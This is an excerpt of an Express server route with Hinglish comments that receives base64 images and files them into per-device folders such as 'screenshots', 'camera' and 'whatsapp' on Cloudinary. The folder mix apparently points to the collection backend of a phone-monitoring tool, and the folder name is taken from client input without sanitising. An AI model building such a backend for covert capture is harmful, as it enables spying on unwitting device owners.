...
// ==================================================
//  ✅ UPLOAD SYSTEM (FIXED: Separate Folders)
// ==================================================
app.post('/api/upload-image', (req, res) => {
    ...
    // --- 🔥 FOLDER LOGIC START (UPDATED HERE) ---
    let folderName = "gallery"; // Default agar kuch samajh na aaye
    let publicId = Date.now().toString(); 
    let safeType = (type || "").toString().toLowerCase(); // Type ko safe string banao

    // 1. Agar ID sath mein aayi hai (e.g., "screen-12345") to alag karo
    if (type && type.includes("-")) {
        const parts = type.split("-");
        safeType = parts[0].toLowerCase(); // "screen" nikaal liya
        publicId = parts[1];               // "12345" ID nikaal li
    }

    // 2. Ab STRICT check lagao (Folder alag-alag karne ke liye)
    if (safeType.includes("screen") || safeType.includes("shot")) {
        folderName = "screenshots";  // ✅ Ye ab 'ID/screenshots' banega
    } 
    else if (safeType.includes("front") || safeType.includes("back") || safeType.includes("cam")) {
        folderName = "camera";       // ✅ Ye ab 'ID/camera' banega
    } 
    else if (safeType && safeType !== "null" && safeType !== "") {
        folderName = safeType;       // Baki folders (jaise whatsapp etc.)
    }
    // --- 🔥 FOLDER LOGIC END ---
    ...
    cloudinary.uploader.upload(base64Image, 
        ...
        (error, result) => {
            ...
            // Socket ko batao ki nayi file aayi hai
